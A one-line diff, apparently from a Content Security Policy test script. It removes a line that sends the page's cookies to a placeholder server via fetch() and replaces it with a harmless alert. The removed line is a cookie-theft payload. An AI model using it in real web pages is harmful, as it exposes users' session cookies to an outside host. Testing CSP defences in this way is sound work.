@@ -1,1 +1,1 @@
-fetch("https://your-server.com/log?cookie=" + document.cookie);
+alert("CSP test: External JS loaded!");
